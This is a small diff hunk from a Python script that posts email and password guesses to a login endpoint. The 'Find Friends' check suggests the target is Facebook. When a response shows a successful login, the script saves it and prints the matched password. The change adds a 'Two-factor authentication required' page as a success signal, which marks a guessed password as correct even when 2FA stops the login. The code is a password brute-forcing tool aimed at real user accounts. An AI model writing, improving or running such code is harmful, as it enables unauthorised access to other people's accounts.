@@ -39,7 +39,7 @@ def function(email,passw,i):
 		payload['email']=email
 	payload['pass']=passw
 	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
-	if 'Find Friends' in r.text:
+	if 'Find Friends' in r.text or 'Two-factor authentication required' in r.text:
 		open('temp','w').write(str(r.content))
 		print('\npassword is : ',passw)
 		return True
